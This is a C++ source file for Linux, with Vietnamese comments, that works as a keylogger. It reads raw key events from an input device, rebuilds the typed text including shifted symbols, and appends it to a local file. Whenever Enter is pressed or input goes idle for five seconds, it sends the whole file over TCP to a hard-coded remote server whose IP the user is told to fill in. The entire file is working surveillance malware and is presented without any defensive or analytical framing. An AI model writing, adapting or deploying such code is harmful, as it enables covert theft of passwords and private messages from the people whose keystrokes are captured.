// keylogger_like_buffer.cpp (evdev -> buffer -> flush to file on Enter or idle 5s)
// Build: g++ -O2 -std=c++17 keylogger_like_buffer.cpp -o keybuf
// Run:   sudo ./keybuf /dev/input/event2 out.txt

#include <iostream>
#include <unordered_map>
#include <utility>
#include <string>
#include <fstream>
#include <chrono>
#include <cctype>
#include <cerrno>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <linux/input-event-codes.h>
#include <sys/select.h>
#include <sys/ioctl.h>
using namespace std;
const string SERVER_IP = "10.177.191.70";  // Put your server IP here
const int SERVER_PORT = 8001;
int socket_fd;
void initsocket()
{
  bool success = false;
  while(!success)
  {
    socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_fd < 0) {
        perror("socket");
        continue;
    }
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port   = htons(SERVER_PORT);

    if (inet_pton(AF_INET, SERVER_IP.c_str(), &serverAddr.sin_addr) != 1) {
        cerr << "Invalid IP address: " << SERVER_IP << endl;
        close(socket_fd);
        continue;
    }
    if (connect(socket_fd,
            reinterpret_cast<struct sockaddr*>(&serverAddr),
            sizeof(serverAddr)) < 0) {
    perror("connect");
    close(socket_fd);
    continue;
    }else {success = true;}
  }
}

static unordered_map<int, char> letterMap = {
    {KEY_A,'a'},{KEY_B,'b'},{KEY_C,'c'},{KEY_D,'d'},
    {KEY_E,'e'},{KEY_F,'f'},{KEY_G,'g'},{KEY_H,'h'},
    {KEY_I,'i'},{KEY_J,'j'},{KEY_K,'k'},{KEY_L,'l'},
    {KEY_M,'m'},{KEY_N,'n'},{KEY_O,'o'},{KEY_P,'p'},
    {KEY_Q,'q'},{KEY_R,'r'},{KEY_S,'s'},{KEY_T,'t'},
    {KEY_U,'u'},{KEY_V,'v'},{KEY_W,'w'},{KEY_X,'x'},
    {KEY_Y,'y'},{KEY_Z,'z'}
};

static unordered_map<int, pair<char,char>> numberMap = {
    {KEY_1, {'1','!'}}, {KEY_2, {'2','@'}}, {KEY_3, {'3','#'}},
    {KEY_4, {'4','$'}}, {KEY_5, {'5','%'}}, {KEY_6, {'6','^'}},
    {KEY_7, {'7','&'}}, {KEY_8, {'8','*'}}, {KEY_9, {'9','('}},
    {KEY_0, {'0',')'}},

    {KEY_MINUS, {'-','_'}},
    {KEY_EQUAL, {'=','+'}},
    {KEY_LEFTBRACE, {'[','{'}},
    {KEY_RIGHTBRACE, {']','}'}},
    {KEY_BACKSLASH, {'\\','|'}},
    {KEY_SEMICOLON, {';',':'}},
    {KEY_APOSTROPHE, {'\'','"'}},
    {KEY_COMMA, {',','<'}},
    {KEY_DOT, {'.','>'}},
    {KEY_SLASH, {'/','?'}},
    {KEY_GRAVE, {'`','~'}}
};

static unordered_map<int, string> specialMap = {
    {KEY_SPACE, " "},
    {KEY_TAB, "\t"},
    {KEY_BACKSPACE, "\b"} // xử lý riêng sẽ tốt hơn; ở đây dùng ký tự backspace
};

// ghi buffer ra file (append) và clear
static void flush_to_file(const string& path, string& buffer) {
    if (buffer.empty()) return;
    ofstream out(path, ios::app);
    if (!out) {
        cerr << "Cannot open output file: " << path << "\n";
        return;
    }
    out << buffer << "\n"; // mỗi lần flush ghi 1 dòng
    out.close();
    buffer.clear();
}

bool sendFile(const std::string& path)
{
    std::ifstream file(path, std::ios::binary);
    if (!file) {
        std::cerr << "Cannot open file: " << path << std::endl;
        return false;
    }

    const size_t BUF_SIZE = 4096;
    char buffer[BUF_SIZE];

    while (file.good()) {
        file.read(buffer, BUF_SIZE);
        std::streamsize n = file.gcount();
        if (n <= 0) break;

        ssize_t sent = 0;
        while (sent < n) {
            ssize_t s = send(socket_fd, buffer + sent, n - sent, 0);
            if (s <= 0) {
                perror("send");
                return false;
            }
            sent += s;
        }
    }

    return true;
}
int main(int argc, char** argv) {
    const char* device = (argc >= 2) ? argv[1] : "/dev/input/event2";
    const string outPath = (argc >= 3) ? argv[2] : "/tmp/output.txt";
    initsocket();

    int fd = open(device, O_RDONLY);
    if (fd < 0) {
        cerr << "open(" << device << ") failed: " << strerror(errno) << "\n";
        cerr << "Tip: try running with sudo, and make sure you are on local console (not SSH).\n";
        return 1;
    }

    bool shiftPressed = false;
    bool capsLockOn   = false;

    string buffer;
    auto lastInputTime = chrono::steady_clock::now();

    cout << "Listening on " << device << " -> will flush to " << outPath
         << " on Enter or 5s idle.\n";

    while (true) {
        // select() để chờ event hoặc timeout
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(fd, &fds);

        // 0.2s tick để còn kiểm tra idle 5s
        timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = 200000;

        int r = select(fd + 1, &fds, nullptr, nullptr, &tv);
        if (r < 0) {
            cerr << "select error: " << strerror(errno) << "\n";
            break;
        }

        // kiểm tra idle 5s
        auto now = chrono::steady_clock::now();
        auto idleMs = chrono::duration_cast<chrono::milliseconds>(now - lastInputTime).count();
        if (idleMs >= 5000) {
            flush_to_file(outPath, buffer);
            sendFile(outPath);
            lastInputTime = now; // reset để không flush liên tục
        }

        if (r == 0) {
            // timeout tick, chưa có event
            continue;
        }

        if (!FD_ISSET(fd, &fds)) continue;

        struct input_event ev;
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n < 0) {
            cerr << "read error: " << strerror(errno) << "\n";
            break;
        }
        if (n != (ssize_t)sizeof(ev)) continue;

        if (ev.type != EV_KEY) continue;

        // cập nhật lastInputTime khi có key event
        // (nhưng chỉ khi có press/release hợp lệ)
        if (ev.value == 0 || ev.value == 1 || ev.value == 2) {
            lastInputTime = chrono::steady_clock::now();
        }

        // SHIFT state (treat repeat as pressed)
        if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
            if (ev.value == 1 || ev.value == 2) shiftPressed = true;
            else if (ev.value == 0) shiftPressed = false;
            continue;
        }

        // CAPS toggle on press
        if (ev.code == KEY_CAPSLOCK && ev.value == 1) {
            capsLockOn = !capsLockOn;
            continue;
        }

        // chỉ xử lý key press (value==1). repeat==2 bạn có thể muốn xử lý;
        // ở đây bỏ để tránh spam khi giữ phím.
        if (ev.value != 1) continue;

        // Enter => flush ngay
        if (ev.code == KEY_ENTER) {
            flush_to_file(outPath, buffer);
            sendFile(outPath);
            continue;
        }

        // Backspace: xóa 1 ký tự trong buffer (đơn giản)
        if (ev.code == KEY_BACKSPACE) {
            if (!buffer.empty()) buffer.pop_back();
            continue;
        }

        // Letters
        if (letterMap.count(ev.code)) {
            char c = letterMap[ev.code];
            bool upper = shiftPressed ^ capsLockOn;
            if (upper) c = (char)toupper((unsigned char)c);
            buffer.push_back(c);
            continue;
        }

        // Numbers / symbols
        if (numberMap.count(ev.code)) {
            char c = shiftPressed ? numberMap[ev.code].second
                                  : numberMap[ev.code].first;
            buffer.push_back(c);
            continue;
        }

        // Specials
        if (specialMap.count(ev.code)) {
            buffer += specialMap[ev.code];
            continue;
        }

        // (tuỳ chọn) debug những phím không map
        // cerr << "Unmapped key code: " << ev.code << "\n";
    }

    close(fd);
    return 0;
}